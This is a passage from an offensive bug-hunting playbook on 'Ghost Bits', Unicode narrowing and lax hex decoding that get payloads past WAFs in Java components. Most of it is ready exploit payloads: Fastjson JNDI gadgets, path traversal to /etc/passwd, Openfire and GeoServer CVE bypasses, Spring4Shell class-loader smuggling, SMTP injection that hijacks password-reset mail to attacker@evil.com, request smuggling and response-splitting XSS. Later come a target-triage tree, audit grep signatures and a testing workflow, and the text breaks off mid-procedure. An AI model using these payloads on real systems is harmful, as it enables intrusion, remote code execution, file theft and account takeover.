---
name: playbook-src-ghost-bits-cast-test-part2
description: "ghost-bits-cast-attack（第 2/3 部分）"
tags: [playbook, src-hunting, ghost, bits, cast]
intent: offensive
---
Payload (smuggle the digit `1` for a UNION column count):

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```

| View    | Content                                             |
|---------|-----------------------------------------------------|
| WAF     | `\u丰丰耳失 union select ...` (no leading digit)    |
| Jackson | `\u0031 union select 1,2,3-- ` -> `1 union select…` |

Pair with [sqli-sql-injection](injection-test.md) for the
downstream UNION / boolean / time-based payload templates.

### 5.4 Fastjson — `\u` and `\x` escape bypass (Families B + C)

Two independent surfaces:

(a) `\u` escape — `Character.digit(c, 16)` accepts Unicode digit categories
beyond ASCII (Thai `๐-๙` U+0E50..U+0E59, Punjabi `੦-੯` U+0A66..U+0A6F,
fullwidth `０-９` U+FF10..U+FF19).

```json
{"\u４_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

WAF view: `\u４_type` (no `@type` literal). Fastjson normalizes fullwidth
`４` to `4`, then handles `_` via the `\x` shortcut below, yielding `@type`.

(b) `\x` escape — Fastjson computes `digits[x1] * 16 + digits[x2]`. An
illegal hex character returns the default value 0.

```
\x4_   ->   '4'(=4) * 16 + '_'(=0) = 0x40 = '@'
```

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

| View     | Field name |
|----------|------------|
| WAF      | `\x4_type` (not `@type`) |
| Fastjson | `@type` -> JdbcRowSetImpl autotype gadget triggers |

### 5.5 Spring / Jetty / Undertow / Vert.x — URL decoding (Families A + B)

Two combinable tricks:

Trick 1 — Family A character substitution in path or query:

```
/api/v1/data?file=阮丯阮丯etc丯passwd
                = ../../etc/passwd at the byte layer
```

Trick 2 — Family B `%2>` folding when Jetty's `TypeUtil.fromHexDigit` is in
the chain:

```
/setup/setup-s/%2>%2>/log.jsp
                = /setup/setup-s/../log.jsp after decode
```

Either alone bypasses most signature WAFs; combined they survive even
"normalized then matched" rules that only see ASCII percent triplets.

Spring CVE-2025-41242 chain (`StringUtils.uriDecode` patched in PR #34673):

```
input :  阮严灵丰丰甲来
       (.)(%)(u)(0)(0)(2)(e)
narrow:  .%u002e
decode:  ..
result:  arbitrary file read via path traversal
```

| Stage           | Path           |
|-----------------|----------------|
| Spring `isInvalidPath()` | `.%u002e` — no literal `..`, allow |
| Backend file resolution  | `..` after `%u002e` decode → traversal |

### 5.6 Angus Mail / Jakarta Mail — SMTP injection (Family A)

Trigger: any application that builds SMTP envelopes or headers from
user-controlled strings. Internal `ASCIIUtility` does:

```java
byte b = (byte) ch;           // 16-bit char silently narrowed
```

Smuggle CRLF as `瘍瘊`:

```
hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

| View | What it parses |
|------|----------------|
| Application validation | a single `From` value containing odd CJK |
| SMTP server            | five separate header lines + body, fully spoofed |

Real impact pattern: Jira-style (CVE-2025-57733) password-reset hijacking,
Confluence domain allowlist bypass — pair with
非邮件 CRLF 现场按协议打（`crlf-injection-test.md` 已收成一行）。

### 5.7 Apache HttpClient `<= 4.5.9` — request smuggling (Family A)

HTTPCLIENT-1974 / HTTPCLIENT-1978: header values pass through
`OutputStreamWriter` plus a narrow-cast write that emits raw `\r\n` for
`\u760D\u760A`.

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

| Hop | Sees |
|-----|------|
| Front proxy / WAF | one request with a long `X-Auth-Token` |
| Origin            | two requests; the second is an admin POST |

Cross-reference [request-smuggling](http-smuggling-test.md) for
chosen-prefix attacks once the desync is confirmed.

### 5.8 JDK HttpServer — response splitting (CVE-2026-21933, Family A)

Reflection of user input into a response header passes through
`com.sun.net.httpserver` writers that low-byte-cast each char.

Payload (URL parameter or upstream header):

```
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

Server emits two logical responses; the second carries an attacker-chosen
body. Escalates to stored XSS, cache poisoning, and SSO redirect chains.

### 5.9 Other affected components

Same Family A primitive, different sink:

- **Lettuce (Redis client)** — command injection by smuggling `\r\n` into
  RESP frames; chain to arbitrary `CONFIG SET dir` + `SAVE` for SSRF-to-RCE.
- **Jodd `FileNameUtil`** — path traversal via `阮` and `丯` because its
  internal write loop narrows.
- **XMLWriter** — tag-name injection when an attribute or text node value is
  pushed through a low-byte writer; XXE / XSS pivot.
- **ActiveJ HTTP** — CRLF injection identical in shape to 5.7 / 5.8.
- **Vert.x HTTP body parser** — Family A in `MultipartParser`.

缺的 ASCII 字用公式 `chr((k<<8)|T)` 自己算（§1 / §3）；完整逐字节两套汉字表已砍。

---

## 6. KNOWN-CVE BYPASS RECIPES

Use these *exactly when the corresponding CVE is patched but a WAF still
fronts the service*. Each Payload below shifts the original ASCII attack into
a form that survives string-based WAF rules.

### Openfire CVE-2023-32315 — auth bypass (Family B)

Original public bypass:

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

Ghost Bits / `%2>` folding bypass (much harder to signature):

```
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

Each `%2>` collapses through Jetty's lax hex into `%2E` = `.`, yielding the
same `../../` traversal without ever emitting `..` or `%2e` to the WAF.

### GeoServer CVE-2024-36401 — RCE via `Runtime` keyword (Family B)

Public WAF rules typically block `Runtime`. Inject one folded character:

```
Ru%6>time
```

Decoder math: `%6>` -> `%6E` -> `n`. The expression evaluator now sees
`Runtime`, the WAF never did.

### Spring4Shell CVE-2022-22965 — class loader chain (Family A)

Required parameter prefix `class.module.classLoader...`. WAFs block the
literal `class`. Substitute via low-byte chars:

```
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
```

| Component | Char  | Code point | Low byte |
|-----------|-------|------------|----------|
| `c`       | `㹣`  | U+3E63     | 0x63     |
| `l`       | `౬`  | U+0C6C     | 0x6C     |
| `a`       | `ᙡ`  | U+1661     | 0x61     |
| `s`       | `⑳`  | U+2473     | 0x73     |
| `s`       | `⑳`  | U+2473     | 0x73     |

Springs's parameter-name resolver narrows back to `class`.

### Spring CVE-2025-41242 — arbitrary file read (Family A + Family B mix)

Already demonstrated in 5.5 above. Payload `阮严灵丰丰甲来` ->
`.%u002e` -> `..` after decode-after-validation.

### Jakarta Mail CVE-2025-57733 — Jira-style mail hijack (Family A)

```
to=victim@org.com瘍瘊Subject: Reset code瘍瘊To: attacker@evil.com瘍瘊瘍瘊Your code is 1234
```

The mail leaves the company SMTP server with valid SPF / DKIM / DMARC, but
its `To:` and `Subject:` are attacker-chosen — high-fidelity phishing.

---

## 7. DETECTION DECISION TREE

Use this when triaging a target. The point is to avoid Ghost Bits when it
cannot help and to *always* try it when the preconditions hold.

```
Is the backend Java? (Server header, error page, JSESSIONID, .do/.action,
                      WebGoat-style stack trace, X-Powered-By, X-Frame-Options
                      with Tomcat default values)
├── No  -> stop, Ghost Bits does not apply
└── Yes
    │
    ├── Is there a WAF / IDS or input filter blocking your literal payload?
    │   ├── No  -> use the literal payload; Ghost Bits is overkill
    │   └── Yes -> continue
    │
    ├── Which sink are you targeting?
    │   ├── File upload via multipart  -> recipe 5.1 (Tomcat filename*)
    │   ├── JSON deserialization       -> recipes 5.3 (Jackson) / 5.4 (Fastjson)
    │   ├── Class loader / BCEL ref    -> recipe 5.2
    │   ├── URL path / parameter       -> recipe 5.5 + Family B `%2>`
    │   ├── Header reflection          -> recipes 5.7 / 5.8
    │   ├── Mail send                  -> recipe 5.6
    │   └── Redis / RESP / XML / RPC   -> recipe 5.9
    │
    ├── Probe with a single non-destructive substitution first
    │   (replace ONE character with its Ghost variant; observe response
    │    diff: status code, length, header echo, error message, time)
    │
    └── If observable difference appears -> escalate by substituting all
                                            blocked characters and chain
                                            through the linked playbook.
```

---

## 8. SAST / CODE-AUDIT SIGNATURES

Three priority tiers when reviewing Java source. Search across all your
project repos, all dependencies you can shade, and the `lib/` of any
deployed appliance.

### Tier 1 — direct narrowing (Family A)

```
\(byte\)\s*\w+
&\s*0[xX][fF][fF]
&\s*255
\.write\(\s*[a-zA-Z_]\w*\s*\)         # OutputStream.write(int)
writeBytes\s*\(
StringBufferInputStream
String\.getBytes\s*\(\s*int
RandomAccessFile.*writeBytes
```

### Tier 2 — lax hex / digit decoding (Families B + C)

```
Character\.digit\s*\(
fromHexDigit
convertHexDigit
fromHex\s*\(
uriDecode
URLDecoder\.decode
sHexValues\[
& 0x1F\)\s*\+\s*\(.*>>.*\) \* 25
```

### Tier 3 — high-risk wrappers and reachability

```
RFC2231                # Tomcat / mail filename* parsing
JavaReader             # BCEL ClassLoader reachable
ASCIIUtility           # Jakarta Mail / Angus Mail
LineParser             # HttpClient header parser
ChunkedDecoder         # request smuggling adjacent
charToHex              # Jackson
encodeUTF8             # candidate for char->byte writer
```

Per-finding triage applies the **five-dimension risk model**:

| Dimension     | Higher risk if                                                     |
|---------------|--------------------------------------------------------------------|
| Input control | HTTP param, header, filename, JSON key, mail address               |
| Validation    | a deny/allow list runs *before* the narrowing site                 |
| Narrowing time | conversion happens after security check                           |
| Syntax target | result enters URL / SMTP / HTTP / Redis / file system / SQL grammar |
| Re-decoding   | Base64, URL-decode, JSON unescape, `%u`, etc. happen later         |

Risk formula:

```
attacker-controlled  +  check-before-narrow  +  result-in-protocol-syntax
                                              +  later-redecoding
                              = HIGH SEVERITY
```

---

## 9. DIFFERENTIAL TESTING WORKFLOW

A reproducible, black-box procedure to find new Ghost Bits sinks (red team)
or to validate a fix (blue team).

```
1. Pick one dangerous byte T at a time (e.g. 0x2E for '.').

2. Generate the candidate set:
       C = { chr((k << 8) | T) for k in 1..255 }
   Drop surrogates 0xD8XX..0xDFXX.

> （续前：playbook-src-ghost-bits-cast-test 第 2/3 部分）
